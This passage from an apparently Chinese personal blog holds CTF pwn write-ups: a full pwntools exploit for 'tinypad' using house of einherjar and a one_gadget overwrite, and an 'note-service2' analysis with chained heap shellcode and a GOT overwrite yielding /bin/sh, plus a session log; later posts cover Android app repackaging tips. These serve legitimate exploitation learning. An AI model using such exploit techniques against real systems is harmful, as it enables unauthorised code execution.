class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">tinypad = ELF(<span class="string">"./tinypad"</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">7777</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./tinypad"</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'a'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(SIZE)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'(CONTENT)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'e'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(INDEX)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'(CONTENT)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">'Is it OK?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'d'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(INDEX)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. leak heap base</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># idx 0</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># idx 2</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)  <span class="comment"># delete idx 1</span></span><br><span class="line">    delete(<span class="number">1</span>)  <span class="comment"># delete idx 0, idx 0 point to idx 1</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)  <span class="comment"># get pointer point to idx1</span></span><br><span class="line">    heap_base = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x80</span></span><br><span class="line">    log.success(<span class="string">'get heap base: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. leak libc base</span></span><br><span class="line">    <span class="comment"># this will trigger malloc_consolidate</span></span><br><span class="line">    <span class="comment"># first idx0 will go to unsorted bin</span></span><br><span class="line">    <span class="comment"># second idx1 will merge with idx0(unlink), and point to idx0</span></span><br><span class="line">    <span class="comment"># third idx1 will merge into top chunk</span></span><br><span class="line">    <span class="comment"># but cause unlink feture, the idx0's fd and bk won't change</span></span><br><span class="line">    <span class="comment"># so idx0 will leak the unsorted bin addr</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    unsorted_offset_arena = <span class="number">8</span> + <span class="number">10</span> * <span class="number">8</span></span><br><span class="line">    main_arena = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - unsorted_offset_arena</span><br><span class="line">    libc_base = main_arena - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'main arena addr: '</span> + hex(main_arena))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. house of einherjar</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'a'</span> * <span class="number">0x18</span>)  <span class="comment"># idx 0</span></span><br><span class="line">    <span class="comment"># we would like trigger house of einherjar at idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'b'</span> * <span class="number">0xf8</span> + <span class="string">'\x11'</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'c'</span> * <span class="number">0xf8</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'d'</span> * <span class="number">0xf8</span>)  <span class="comment">#idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># create a fake chunk in tinypad's 0x100 buffer, offset 0x20</span></span><br><span class="line">    tinypad_addr = <span class="number">0x602040</span></span><br><span class="line">    fakechunk_addr = tinypad_addr + <span class="number">0x20</span></span><br><span class="line">    fakechunk_size = <span class="number">0x101</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(</span><br><span class="line">        fakechunk_addr)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + fakechunk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite idx 1's prev_size and</span></span><br><span class="line">    <span class="comment"># set minaddr of size to '\x00'</span></span><br><span class="line">    <span class="comment"># idx 0's chunk size is 0x20</span></span><br><span class="line">    diff = heap_base + <span class="number">0x20</span> - fakechunk_addr</span><br><span class="line">    log.info(<span class="string">'diff between idx1 and fakechunk: '</span> + hex(diff))</span><br><span class="line">    <span class="comment"># '\0' padding caused by strcpy</span></span><br><span class="line">    diff_strip = p64(diff).strip(<span class="string">'\0'</span>)</span><br><span class="line">    number_of_zeros = len(p64(diff)) - len(diff_strip)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(number_of_zeros + <span class="number">1</span>):</span><br><span class="line">        data = diff_strip.rjust(<span class="number">0x18</span> - i, <span class="string">'f'</span>)</span><br><span class="line">        edit(<span class="number">1</span>, data)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nDeleted.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fix the fake chunk size, fd and bk</span></span><br><span class="line">    <span class="comment"># fd and bk must be unsorted bin</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(main_arena + <span class="number">88</span>) +</span><br><span class="line">         p64(main_arena + <span class="number">88</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. overwrite malloc_hook with one_gadget</span></span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0x45216</span></span><br><span class="line">    environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line">    log.info(<span class="string">'one gadget addr: '</span> + hex(one_gadget_addr))</span><br><span class="line">    log.info(<span class="string">'environ pointer addr: '</span> + hex(environ_pointer))</span><br><span class="line">    <span class="comment">#fake_malloc_chunk = main_arena - 60 + 9</span></span><br><span class="line">    <span class="comment"># set memo[0].size = 'a'*8,</span></span><br><span class="line">    <span class="comment"># set memo[0].content point to environ to leak environ addr</span></span><br><span class="line">    fake_pad = <span class="string">'f'</span> * (<span class="number">0x100</span> - <span class="number">0x20</span> - <span class="number">0x10</span>) + <span class="string">'a'</span> * <span class="number">8</span> + p64(</span><br><span class="line">        environ_pointer) + <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x602148</span>)</span><br><span class="line">    <span class="comment"># get a fake chunk</span></span><br><span class="line">    add(<span class="number">0x100</span> - <span class="number">8</span>, fake_pad)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get environ addr</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    environ_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    environ_addr = u64(environ_addr)</span><br><span class="line">    main_ret_addr = environ_addr - <span class="number">30</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set memo[0].content point to main_ret_addr</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(main_ret_addr))</span><br><span class="line">    <span class="comment"># overwrite main_ret_addr with one_gadget addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(one_gadget_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
-<h2 id="2020-3-6"><a href="#2020-3-6" class="headerlink" title="2020-3-6"></a>2020-3-6</h2><h3 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h3><h4 id="前言批话"><a href="#前言批话" class="headerlink" title="前言批话"></a>前言批话</h4><p>竟然一个月没上 adworld 了？？以后建个 repo 专门放 pwn，不在这更了。</p>
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>题目：adworld – note-service2</p>
-<p>害，我都没看出来这是个啥。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_C07</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  ____ _   _ ___  ____ ____ ___  ____ ____ ____ ____ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  |     \\_/  |__] |___ |__/ |__] |___ |__| |    |___ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  |___   |   |__] |___ |  \\ |    |___ |  | |___ |___ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#                                                     "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  Welcome to CyberPeace note service 2!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"#                                                     "</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个是读个数字，choice，最后用了神奇的 atoi 函数，这个函数会略过前面非数字的字母，到 ‘\0’ 转换结束。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B91</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_B69((__int64)&amp;nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(&amp;nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_AC3</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">      v1 = sub_B91();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"size:"</span>);</span><br><span class="line">      result = sub_B91();</span><br><span class="line">      v2 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 这个 v1 可以越界，就是任意地址写</span></span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>(result);</span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"malloc error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">        sub_B69(qword_2020A0[v1], v2);</span><br><span class="line">        result = dword_20209C++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v0 = sub_B91();</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_2020A0[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
-<li>checksec 发现没有 NX，也就是堆可执行。</li>
-<li>由于一个堆块只能写 7 个字节，所有要跳，把需要的指令写到不同堆块里，每个堆块跳到下一个堆块。</li>
-<li>修改 atoi 的 got 表，触发。</li>
-<li>输入 /bin/sh，香。</li>
-</ol>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(p, index, sz, cont)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>, str(sz))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./note-service2"</span>)</span><br><span class="line"><span class="comment">#p = remote("111.198.29.45", 43943)</span></span><br><span class="line"></span><br><span class="line">ASM = []</span><br><span class="line">ASM.append(asm(<span class="string">"xor rax,rax"</span>) + <span class="string">b"\x90\x90\xeb\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"mov eax,0x3b"</span>) + <span class="string">b"\xeb\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"xor rsi,rsi"</span>) + <span class="string">b"\x90\x90\xed\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"xor rdx,rdx"</span>) + <span class="string">b"\x90\x90\xed\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"syscall"</span>) + <span class="string">b"\x90\x90\x90\x90\x90"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">    create(p, i, <span class="number">8</span>, ASM[i])</span><br><span class="line"></span><br><span class="line">delete(p, <span class="number">0</span>)</span><br><span class="line">create(p, <span class="number">-8</span>, <span class="number">8</span>, ASM[<span class="number">0</span>])</span><br><span class="line">p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>但是我 cat flag 的时候跪了啊啊啊啊。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    <span class="string">'cat flag\n'</span></span><br><span class="line">$ cat flag.txt</span><br><span class="line">[DEBUG] Sent 0xd bytes:</span><br><span class="line">    <span class="string">'cat flag.txt\n'</span></span><br><span class="line">[*] Closed connection to 111.198.29.45 port 43943</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br><span class="line">[*] Stopped process <span class="string">'./note-service2'</span> (pid 4204)</span><br></pre></td></tr></table></figure>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/programming/">编程</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-majiabao" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/12/01/majiabao/" class="article-date">
-      <time datetime="2019-12-01T03:47:25.000Z" itemprop="datePublished">2019-12-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/01/majiabao/">逆向改包 Tips</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>配置网络访问权限及其它权限</li>
-<li>注册Activity</li>
-<li>androidx 有问题可换成 android</li>
-<li>改资源 id</li>
-<li>改类名</li>
-<li>smali/androidx 要复制过去</li>
-</ol>
-<p>开发时遇到问题一是 android 9 以上的网络问题，二是爆栈触发 GC，延迟 30 多秒后起来，网上搜来的代码一定要看一下，直接用有 bug。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base-config</span> <span class="attr">cleartextTrafficPermitted</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"system"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"user"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">base-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag"><span class="attr">...</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:networkSecurityConfig</span>=<span class="string">"@xml/network_security_config"</span></span></span><br><span class="line"><span class="tag"><span class="attr">...</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### ssj</span></span><br><span class="line">   <span class="built_in"> new-instance </span>v0, <span class="class">Landroid/content/Intent;</span></span><br><span class="line">   <span class="built_in"> const-class </span>v1, <span class="class">Lcom/ssj/loopviewdemo/LunbotuActivity;</span></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v0, p0, v1&#125;, <span class="class">Landroid/content/Intent;</span>-&gt;&lt;init&gt;(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/Class;</span>)V</span><br><span class="line"><span class="keyword">    .line</span> 15</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"intent"</span>:<span class="class">Landroid/content/Intent;</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, v0&#125;, <span class="class">Lcom/gxswine/new7/MainActivity;</span>-&gt;startActivity(<span class="class">Landroid/content/Intent;</span>)V</span><br></pre></td></tr></table></figure>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/programming/">编程</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/马甲包/">马甲包</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-people-still-here" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/11/23/people-still-here/" class="article-date">
-      <time datetime="2019-11-23T12:32:02.000Z" itemprop="datePublished">2019-11-23</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/23/people-still-here/">人没丢……</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>最近人没丢，但也没干啥正事……没啥可写的。</p>
-<p>接下来可能会继续玩 pwn，可能会继续去搞 mjb，可能会留下来做编译器……</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/其它/">其它</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/其它/">其它</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-zhulianzhai" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/07/25/zhulianzhai/" class="article-date">
-      <time datetime="2019-07-25T13:25:21.000Z" itemprop="datePublished">2019-07-25</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
